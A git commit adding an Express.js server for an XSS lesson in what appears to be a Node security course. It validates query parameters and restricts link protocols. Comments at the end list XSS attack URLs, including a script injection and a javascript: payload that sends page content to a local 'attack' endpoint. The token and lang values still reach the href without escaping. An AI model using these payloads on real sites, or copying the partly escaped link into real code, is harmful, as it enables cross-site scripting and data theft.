a98c6e0877bc3ddbc8b4eedcff96bb08f5452320
stardvst <lilia.manukyan@hotmail.com>
2026-01-01 18:16:22 +0400

    added param validation

---
+++ 8-securing-node-apps/6-express-xss/parameter-protocol-safe-server.js
@@ -0,0 +1,70 @@
+const express = require('express');
+const he = require('he');
+
+const app = express();
+
+function safeHref(input) {
+  if(!input) return '#';
+
+  // Only allow relative URLs
+  if(input.startsWith('/')) return input;
+
+  // Or allow only http(s)
+  try {
+    const u = new URL(input);
+    if(u.protocol === 'http:' || u.protocol === 'https:') {
+      return u.href;
+    }
+  } catch { }
+
+  return '#';
+}
+
+function validateParameters({ previous, lang, token }, query) {
+  return (
+    Object.keys(query).length <= 3 &&
+    typeof lang === 'string' &&
+    lang.length == 2 &&
+    typeof token === 'string' &&
+    token.length == 16 &&
+    typeof previous === 'string' &&
+    previous.length <= 16
+  );
+}
+
+app.get('/', (req, res) => {
+  const { previous, lang, token } = req.query;
+
+  if(!validateParameters(req.query, req.query)) {
+    res.status(422).end();
+    return;
+  }
+
+  getServiceStatus((status) => {
+    // const href = `${he.encode(previous || '')}${he.encode(token || '')}${he.encode(lang || '')}`;
+    const href = `${safeHref(previous || '')}${token || ''}${lang || ''}`;
+    res.send(`
+      <h1>Service Status</h1>
+      <div id="status">${status}</div>
+      <div>
+        <a href="${href}">Go Back</a>
+      </div>
+    `);
+  });
+});
+
+getServiceStatus = (callback) => {
+  const status = 'All systems operational';
+  callback(status);
+}
+
+app.listen(3000, () => {
+  console.log('Server is running on http://localhost:3000');
+});
+
+// Example request to craft XSS attack:
+// http://localhost:3000/?previous=%22%3E%3Cscript%3Edocument.getElementById(%22status%22).innerHTML=%22Hacked!%22;%3C/script%3E%20%3Ca%20href=%22/
+// http://localhost:3000/?previous=javascript:(new%20Image()).src=`http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}`
+// http://localhost:3000/?previous=sixteencharacter&token=sixteencharacter&lang=en
+// http://localhost:3000/?previous=sixteencharacters&token=sixteencharacters&lang=en
+// http://localhost:3000/?previous=sixteencharacter&token=sixteencharacter&lang=en&extra=value
